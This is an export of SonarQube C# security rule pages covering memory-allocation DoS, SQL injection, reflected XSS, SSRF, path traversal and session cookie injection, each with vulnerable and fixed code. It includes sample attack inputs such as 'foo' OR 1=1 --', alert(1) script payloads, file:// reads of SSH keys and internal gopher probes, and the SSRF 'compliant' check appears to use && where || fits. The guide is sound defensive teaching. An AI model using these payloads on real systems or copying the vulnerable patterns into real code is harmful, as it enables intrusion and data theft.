<p>In the worst case, when the application is deployed in an uncontained environment, directly on its host system, the memory exhaustion will affect
the whole hosting server. The server’s operating system might start killing arbitrary memory-intensive processes, including the main application or
other sensitive ones. This will result in a general operating failure, also known as a Denial of Service (DoS).</p>
<p>In cases where the application is deployed in a virtualized or otherwise contained environment, or where memory usage limits are in place, the
consequences are limited to the vulnerable application only. In that case, other processes and applications hosted on the same server may keep on
running without perturbation. The mainly affected application will still stop working properly.</p>
<p>In general, that kind of DoS attack can have severe financial consequences. They are particularly important when the affected systems are
business-critical.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to a memory allocation injection because the size of a memory allocation is determined using a user-controlled
source. It then performs the actual allocation without any verification or other sanitization over the provided size.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
[Route("NonCompliantArrayList")]
public string NonCompliantArrayList()
{
    int size;
    try
    {
        size = int.Parse(Request.Query["size"]);
    }
    catch (FormatException)
    {
        return "Number format exception while reading size";
    }
    ArrayList arrayList = new ArrayList(size); // Noncompliant
    return size + " bytes were allocated.";
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public const int MAX_ALLOC_SIZE = 1024;

[Route("CompliantArrayList")]
public string CompliantArrayList()
{
    int size;
    try
    {
        size = int.Parse(Request.Query["size"]);
    }
    catch (FormatException)
    {
        return "Number format exception while reading size";
    }
    size = Math.Min(size, MAX_ALLOC_SIZE);
    ArrayList arrayList = new ArrayList(size);
    return size + " bytes were allocated.";
}
</pre>
<h3>How does this work?</h3>
<h4>Enforce an upper limit</h4>
<p>When performing a memory allocation whose size depends on a user-controlled parameter, it is of prime importance to enforce an upper limit to the
size being allocated. This will prevent any overly big memory slot from being consumed by a single allocation.</p>
<p>Note that forcing an upper limit will not prevent Denial of Service attacks. When an allocation size is restricted to a reasonable amount,
attackers can still request the allocating feature multiple times until the combined allocation size becomes big enough to cause exhaustion. However,
the smaller the allowed allocation size, the higher the number of necessary requests and, thus, the higher the required resources on the attacker
side. As for most of the DoS attack vectors, a trade-off must be found to prevent most attackers from causing exhaustion while keeping a good level of
performance and usability.</p>
<p>Here, the example compliant code uses the <code>Math.Min</code> function to enforce a reasonable upper bound to the allocation size. In that case,
no more than 1024 bytes can be allocated at a time.</p>
<h4>Harden the execution environment configuration</h4>
<p>As a defense in depth measure, it is advised to harden the execution environment configuration regarding memory usage. This can effectively reduce
the scope of a successful Denial of Service attack and prevent a complete outage, potentially ranging over multiple applications.</p>
<p>When running the application in a contained environment, like a Docker container, it is usually possible to limit the amount of memory provided to
the contained environment. In that case, memory exhaustion will only impact the application hosting container and not the host system.</p>
<p>When running the application directly on a physical or heavy virtualized server, memory limits can sometimes be set on the application’s associated
service account. For example, the <code>ulimit</code> mechanism of Unix based operating systems can be used for that purpose. With such a limit set
up, memory exhaustion only impacts the applications and processes owned by the related service account.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://owasp.org/www-community/attacks/Denial_of_Service">OWASP</a> - Denial of Service </li>
  <li> <a href="https://www.linux.org/docs/man8/pam_limits.html">Linux.org</a> - pam_limits - PAM module to limit resources </li>
  <li> <a href="https://access.redhat.com/solutions/1257953">RedHat</a> - How to set limits for services in RHEL and systemd </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/789">CWE-789 - Memory Allocation with Excessive Size Value</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S3649">
              roslyn.sonaranalyzer.security.cs:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul>
  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>
  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul>
      <li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">our article on this topic</a> </li>
    </ul>  </li>
</ul>
<h2>How to fix it in Entity Framework Core</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo' OR 1=1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    private readonly UserAccountContext Context;

    public IActionResult Authenticate(string user, string pass)
    {
        var query = "SELECT * FROM users WHERE user = '" + user + "' AND pass = '" + pass + "'";

        var queryResults = Context
            .Database
            .FromSqlRaw(query);

        if (queryResults == 0)
        {
            return Unauthorized();
        }

        return Ok();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
public class ExampleController : Controller
{
    private readonly UserAccountContext Context;

    public IActionResult Authenticate(string user, string pass)
    {
        var query = "SELECT * FROM users WHERE user = {0} AND pass = {1}";

        var queryResults = Context
            .Database
            .FromSqlRaw(query, user, pass);

        if (queryResults == 0)
        {
            return Unauthorized();
        }

        return Ok();
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user = ? AND pass = ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/">SonarSource, Exploiting Hibernate Injections</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ">CERT, IDS00-J.</a> - Prevent SQL injection </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5131">
              roslyn.sonaranalyzer.security.cs:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class HelloController : Controller
{
    [HttpGet]
    public void Hello(string name, HttpResponse response)
    {
        string html = "&lt;h1&gt;Hello"+ name +"&lt;/h1&gt;"
        response.Write(html);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class HelloController : Controller
{
    [HttpGet]
    public void Hello(string name, HttpResponse response)
    {
        string html = "&lt;h1&gt;Hello"+ HttpUtility.HtmlEncode(name) +"&lt;/h1&gt;"
        response.Write(html);
    }
}
</pre>
<h3>How does this work?</h3>
<p>If the HTTP response is HTML code, it is highly recommended to use <a
href="https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c">Razor-based view templates</a> to
generate it. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing
the risk of cross-site scripting vulnerabilities.</p>
<h4>Encode data according to the HTML context</h4>
<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact
from the end user’s point of view but make it uninterpretable by web browsers.</p>
<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific
encoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>
<table>
  <colgroup>
    <col style="width: 25%;">
    <col style="width: 25%;">
    <col style="width: 25%;">
    <col style="width: 25%;">
  </colgroup>
  <thead>
    <tr>
      <th>Context</th>
      <th>Code example</th>
      <th>Exploit example</th>
      <th>Encoding</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td> <p>Inbetween tags</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  { data }
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div&gt;
  &lt;script&gt;
    alert(1)
  &lt;/script&gt;
&lt;/div&gt;
</pre></td>
      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>
        <ul>
          <li> &amp; → &amp;amp; </li>
          <li> &lt; → &amp;lt; </li>
          <li> &gt; → &amp;gt; </li>
          <li> " → &amp;quot; </li>
          <li> ' → &amp;#x27; </li>
        </ul> </td>
    </tr>
    <tr>
      <td> <p>In an attribute surrounded with single or double quotes</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag="{ data }"&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag=""
     onmouseover="alert(1)"&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>
        <ul>
          <li> &amp; → &amp;amp; </li>
          <li> &lt; → &amp;lt; </li>
          <li> &gt; → &amp;gt; </li>
          <li> " → &amp;quot; </li>
          <li> ' → &amp;#x27; </li>
        </ul> </td>
    </tr>
    <tr>
      <td> <p>In an unquoted attribute</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag={ data }&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;div tag=foo
     onmouseover=alert(1)&gt;
  ...
&lt;/div&gt;
</pre></td>
      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>
    </tr>
    <tr>
      <td> <p>In a URL attribute</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;a href="{ data }"&gt;
  ...
&lt;/a&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;a href="javascript:alert(1)"&gt;
  ...
&lt;/a&gt;
</pre></td>
      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>
      as a scheme.</p> </td>
    </tr>
    <tr>
      <td> <p>In a script block</p> </td>
      <td><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  { data }
&lt;/script&gt;
</pre></td>
      <td><pre>
&lt;!doctype html&gt;
&lt;script&gt;
  alert(1)
&lt;/script&gt;
</pre></td>
      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>
&lt;!doctype html&gt;
&lt;script data="{ data }"&gt;
  ...
&lt;/script&gt;
</pre></td>
    </tr>
  </tbody>
</table>
<p><code>System.Web.HttpUtility.HtmlEncode</code> is the recommended method to encode HTML entities.</p>
<h3>Pitfalls</h3>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of "javascript:" URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br> <a href="https://web.dev/csp-xss/">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>
  <li> <a href="https://blog.sonarsource.com/ghost-admin-takeover">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>
  <li> <a href="https://samy.pl/myspace/">Samy Kamkar, The MySpace Worm</a> </li>
</ul>
<h3>Conference presentations</h3>
<ul>
  <li> <a href="https://www.youtube.com/watch?v=ksq7e6UUDag">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5144">
              roslyn.sonaranalyzer.security.cs:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it performs an HTTP request to a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController: Controller
{
    [HttpGet]
    public IActionResult ImageFetch(string location)
    {
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(location);

        return Ok();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController: Controller
{
    private readonly string[] allowedSchemes = { "https" };
    private readonly string[] allowedDomains = { "trusted1.example.com", "trusted2.example.com" };

    [HttpGet]
    public IActionResult ImageFetch(string location)
    {
        Uri uri = new Uri(location);

        if (!allowedDomains.Contains(uri.Host) &amp;&amp; !allowedSchemes.Contains(uri.Scheme))
        {
            return BadRequest();
        }

        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);

        return Ok();
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Top 10 2021 Category A10 - Server-Side Request
  Forgery (SSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/918">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2083">
              roslyn.sonaranalyzer.security.cs:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to delete arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    private static string TargetDirectory = "/path/to/target/directory/";

    public void Example(string filename)
    {
        string path = Path.Combine(TargetDirectory, filename);
        System.IO.File.Delete(path);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    private static string TargetDirectory = "/path/to/target/directory/";

    public void Example(string filename)
    {
        string path = Path.Combine(TargetDirectory, filename);
        string canonicalDestinationPath = Path.GetFullPath(path);

        if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))
        {
            System.IO.File.Delete(canonicalDestinationPath);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>
  <li> Resolve the canonical path of the file by using methods like <code>System.IO.Path.GetFullPath</code>. This will resolve relative path or path
  components like <code>../</code> and removes any ambiguity regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
</ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol>
  <li> <code>data = transform(user_input);</code> </li>
  <li> <code>data = normalize(data);</code> </li>
  <li> <code>data = sanitize(data);</code> </li>
  <li> <code>use(data);</code> </li>
</ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v=V-DdcKADnFk">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>TargetDirectory</code> does not end with a path
separator:</p>
<pre>
private static string TargetDirectory = "/Users/John";

public void Example(string filename)
{
    string canonicalDestinationPath = Path.GetFullPath(filename);

    if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))
    {
        System.IO.File.Delete(canonicalDestinationPath);
    }
}
</pre>
<p>This check can be bypassed because <code>"/Users/Johnny/file".startsWith("/Users/John")</code> returns <code>true</code>. Thus, for validation,
<code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3">Here is a real-life example of this vulnerability.</a></p>
<h4>Do not use Path.Combine as a validator</h4>
<p>The <a href="https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine">official documentation</a> states that if any argument other than
the first is an absolute path, any previous argument is discarded.</p>
<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6287">
              roslyn.sonaranalyzer.security.cs:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a
href="https://example.com?cookie=injectedcookie">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    [HttpGet]
    public IActionResult CheckCookie(string cookie)
    {
        if (Request.Cookies["ASP.NET_SessionId"] == null)
        {
            Response.Cookies.Append("ASP.NET_SessionId", cookie);
        }

        return View("Welcome");
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    [HttpGet]
    public IActionResult CheckCookie()
    {
        if (Request.Cookies["ASP.NET_SessionId"] == null)
        {
            return View("GetCookie");
        }

        return View("Welcome");
    }
}
</pre>
